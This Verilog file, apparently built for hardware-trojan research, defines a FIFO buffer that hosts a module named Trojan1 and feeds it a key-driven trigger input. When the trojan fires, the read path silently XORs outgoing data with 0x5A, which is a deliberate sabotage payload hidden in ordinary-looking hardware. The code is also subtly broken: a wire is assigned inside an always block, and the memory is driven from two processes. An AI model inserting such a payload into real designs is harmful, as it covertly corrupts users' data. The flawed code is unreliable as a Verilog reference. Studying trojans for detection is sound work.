// FIFO Host Circuit for Trojan1  
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
module trojan1_fifo_host #(
    parameter DATA_WIDTH = 12,    // FIFO data width
    parameter DEPTH = 16,         // FIFO depth (power of 2)
    parameter ADDR_WIDTH = 4,     // log2(DEPTH)
    parameter [27:0] R1_KEY = 28'hBEEF123  // Key for r1 generation
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] write_data,
    input wire write_enable,
    input wire read_enable,
    output reg [DATA_WIDTH-1:0] read_data,
    output reg fifo_full,
    output reg fifo_empty,
    output reg fifo_overflow,
    output reg fifo_underflow
);

    // Trojan interface (fixed width)
    wire trojan_r1;
    wire trojan_trigger;
    
    // FIFO structure
    reg [DATA_WIDTH-1:0] fifo_mem [0:DEPTH-1];
    reg [ADDR_WIDTH:0] write_ptr;  // Extra bit for full/empty detection
    reg [ADDR_WIDTH:0] read_ptr;   // Extra bit for full/empty detection
    reg [ADDR_WIDTH:0] fifo_count;
    reg [27:0] r1_generator;
    reg [2:0] r1_select;
    
    // R1 signal generation using rotating key
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            r1_generator <= R1_KEY;
            r1_select <= 3'b0;
        end else if (write_enable || read_enable) begin
            r1_generator <= {r1_generator[26:0], r1_generator[27] ^ r1_generator[25] ^ r1_generator[2]};
            r1_select <= r1_select + 1;
        end
    end
    
    // Select different bits for r1 based on operation
    always @(*) begin
        case (r1_select)
            3'b000: trojan_r1 = r1_generator[0];
            3'b001: trojan_r1 = r1_generator[4];
            3'b010: trojan_r1 = r1_generator[8];
            3'b011: trojan_r1 = r1_generator[12];
            3'b100: trojan_r1 = r1_generator[16];
            3'b101: trojan_r1 = r1_generator[20];
            3'b110: trojan_r1 = r1_generator[24];
            3'b111: trojan_r1 = r1_generator[27];
            default: trojan_r1 = 1'b0;
        endcase
    end
    
    // FIFO status flags
    always @(*) begin
        fifo_full = (fifo_count == DEPTH);
        fifo_empty = (fifo_count == {ADDR_WIDTH+1{1'b0}});
    end
    
    // FIFO counter
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            fifo_count <= {ADDR_WIDTH+1{1'b0}};
        end else begin
            case ({write_enable & ~fifo_full, read_enable & ~fifo_empty})
                2'b10: fifo_count <= fifo_count + 1;  // Write only
                2'b01: fifo_count <= fifo_count - 1;  // Read only
                2'b11: fifo_count <= fifo_count;      // Read and write
                default: fifo_count <= fifo_count;    // No operation
            endcase
        end
    end
    
    // Write pointer management
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            write_ptr <= {ADDR_WIDTH+1{1'b0}};
        end else if (write_enable && !fifo_full) begin
            write_ptr <= write_ptr + 1;
        end
    end
    
    // Read pointer management
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            read_ptr <= {ADDR_WIDTH+1{1'b0}};
        end else if (read_enable && !fifo_empty) begin
            read_ptr <= read_ptr + 1;
        end
    end
    
    // FIFO write operation
    always @(posedge clk) begin
        if (write_enable && !fifo_full) begin
            fifo_mem[write_ptr[ADDR_WIDTH-1:0]] <= write_data;
        end
    end
    
    // FIFO read operation with trojan trigger integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            read_data <= {DATA_WIDTH{1'b0}};
        end else if (read_enable && !fifo_empty) begin
            // Mix read data with trojan trigger
            read_data <= fifo_mem[read_ptr[ADDR_WIDTH-1:0]] ^ (trojan_trigger ? {{(DATA_WIDTH-8){1'b0}}, 8'h5A} : {DATA_WIDTH{1'b0}});
        end
    end
    
    // Error flag management
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            fifo_overflow <= 1'b0;
            fifo_underflow <= 1'b0;
        end else begin
            fifo_overflow <= write_enable && fifo_full;
            fifo_underflow <= read_enable && fifo_empty;
        end
    end
    
    // Initialize FIFO memory
    integer i;
    always @(posedge rst) begin
        if (rst) begin
            for (i = 0; i < DEPTH; i = i + 1) begin
                fifo_mem[i] <= {DATA_WIDTH{1'b0}};
            end
        end
    end
    
    // Instantiate Trojan1
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

